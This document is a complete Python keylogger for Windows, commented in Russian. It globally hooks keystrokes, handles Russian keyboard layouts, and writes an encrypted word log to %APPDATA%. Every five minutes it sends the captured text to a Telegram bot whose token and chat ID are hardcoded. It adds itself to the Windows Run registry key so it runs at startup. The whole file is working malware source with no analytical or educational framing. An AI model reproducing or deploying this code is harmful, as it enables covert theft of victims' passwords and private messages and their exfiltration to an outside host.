import os
import ctypes
from ctypes import wintypes
import keyboard
from datetime import datetime
from cryptography.fernet import Fernet
import requests
import threading
import time
import winreg

# ─── Фиксированная папка в %APPDATA% ───────────────────────────────
appdata = os.getenv('APPDATA')
base_dir = os.path.join(appdata, 'keylogger')
os.makedirs(base_dir, exist_ok=True)

# пути к файлам внутри фиксированной папки
LOG_FILE = os.path.join(base_dir, 'keylogs.txt')
KEY_FILE = os.path.join(base_dir, 'key.key')

# ─── WinAPI: определение раскладки активного окна ──────────────────
user32 = ctypes.WinDLL('user32', use_last_error=True)
GetForegroundWindow      = user32.GetForegroundWindow
GetWindowThreadProcessId = user32.GetWindowThreadProcessId
GetKeyboardLayout        = user32.GetKeyboardLayout

GetWindowThreadProcessId.argtypes = [wintypes.HWND, ctypes.POINTER(wintypes.DWORD)]
GetWindowThreadProcessId.restype  = wintypes.DWORD
GetKeyboardLayout.argtypes       = [wintypes.DWORD]
GetKeyboardLayout.restype        = wintypes.HKL

LANG_RU = 0x419  # русский

def is_ru_layout() -> bool:
    hwnd = GetForegroundWindow()
    tid  = GetWindowThreadProcessId(hwnd, None)
    hkl  = GetKeyboardLayout(tid)
    return (hkl & 0xFFFF) == LANG_RU

# ─── Таблица для маппинга ASCII → кириллица при RU-раскладке ────────
ENG_TO_RU = {
    'q':'й','w':'ц','e':'у','r':'к','t':'е','y':'н','u':'г','i':'ш','o':'щ','p':'з',
    '[':'х',']':'ъ','a':'ф','s':'ы','d':'в','f':'а','g':'п','h':'р','j':'о','k':'л',
    'l':'д',';':'ж',"'":'э','z':'я','x':'ч','c':'с','v':'м','b':'и','n':'т','m':'ь',
    ',':'б','.':'ю',
}
for k, v in list(ENG_TO_RU.items()):
    ENG_TO_RU[k.upper()] = v.upper()

class KeyLogger:
    SEPARATORS = {'space', 'enter', 'tab'}
    BACKSPACE  = 'backspace'

    def __init__(self):
        self.filename   = LOG_FILE
        self.key_file   = KEY_FILE
        self.buffer     = ""
        self.log_buffer = []

        # загрузка или генерация ключа шифрования
        if os.path.exists(self.key_file):
            with open(self.key_file, 'rb') as f:
                key = f.read()
        else:
            key = Fernet.generate_key()
            with open(self.key_file, 'wb') as f:
                f.write(key)
        self.cipher = Fernet(key)

        # параметры Telegram
        self.telegram_token = '7351082244:AAHWNMAEpsiimvQXWRLjWueLJ48HN_E-Zug'
        self.chat_id        = '5995115618'

        # запускаем поток для периодической отправки
        threading.Thread(target=self._sender, daemon=True).start()

    def _sender(self):
        while True:
            if self.log_buffer:
                payload = "\n".join(self.log_buffer)
                try:
                    requests.post(
                        f"https://api.telegram.org/bot{self.telegram_token}/sendMessage",
                        data={"chat_id": self.chat_id, "text": payload}
                    )
                except Exception:
                    pass
                self.log_buffer.clear()
            time.sleep(300)

    def _on_event(self, event: keyboard.KeyboardEvent):
        # обрабатываем только нажатия
        if event.event_type != "down":
            return

        name = event.name  # ASCII-имя клавиши

        # разделители: завершаем слово
        if name in self.SEPARATORS:
            word = self.buffer.strip()
            if word:
                ts    = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                entry = f"{ts} - {word}"
                print(entry)
                enc = self.cipher.encrypt((entry + "\n").encode('utf-8'))
                with open(self.filename, 'a', encoding='utf-8') as f:
                    f.write(enc.decode('utf-8') + "\n")
                self.log_buffer.append(entry)
            self.buffer = ""
            return

        # backspace
        if name == self.BACKSPACE:
            self.buffer = self.buffer[:-1]
            return

        # одиночный печатаемый символ
        if len(name) == 1:
            ch = name
            if is_ru_layout():
                ch = ENG_TO_RU.get(ch, ch)
            self.buffer += ch

    def main(self):
        keyboard.hook(self._on_event)  # глобальный хук (требует админ-прав)
        keyboard.wait()

def add_to_startup(exe_name="keylogger_words.exe"):
    path = os.path.abspath(exe_name)
    try:
        reg = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0, winreg.KEY_SET_VALUE
        )
        winreg.SetValueEx(reg, "KeyLoggerWords", 0, winreg.REG_SZ, path)
        reg.Close()
        print("✅ Добавлено в автозагрузку")
    except Exception as e:
        print("Ошибка автозапуска:", e)

if __name__ == '__main__':
    add_to_startup("keylogger_words.exe")
    KeyLogger().main()
